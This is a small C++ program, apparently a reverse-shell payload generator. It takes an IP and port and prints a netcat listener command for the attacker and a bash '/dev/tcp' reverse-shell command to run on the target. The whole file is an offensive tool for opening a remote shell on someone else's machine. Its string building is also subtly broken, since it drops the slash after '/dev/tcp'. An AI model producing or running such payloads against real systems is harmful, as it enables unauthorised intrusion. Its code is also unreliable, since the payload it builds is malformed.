#include <iostream>
#include <string>

// Generate the bash reverse-shell payload
std::string generateBashPayload(const std::string &ip, int port) {
  return "bash -i >& /dev/tcp" + ip + "/" + std::to_string(port) + " 0>&1";
}

// Print usage if user gives wrong args
void printUsage(const char *progName) {
  std::cerr << "Usage: " << progName << " <IP> <PORT>\n"
            << "Example:\n"
            << "  " << progName << " 10.0.0.5 4444\n";
}

int main(int argc, char *argv[]) {
  if (argc != 3) {
    printUsage(argv[0]);
    return 1;
  }

  std::string ip = argv[1];
  int port = std::stoi(argv[2]);

  // 1) Generate payload
  std::string payload = generateBashPayload(ip, port);

  // 2) Print instructions for attacker
  std::cout << "=== Catch the shell with ===\n"
            << "On your machine, run:\n"
            << " nc -nlvp " << port << "\n\n";

  // 3) Print what to run on the target
  std::cout << "=== Command for the target ===\n" << payload << "\n";

  return 0;
}
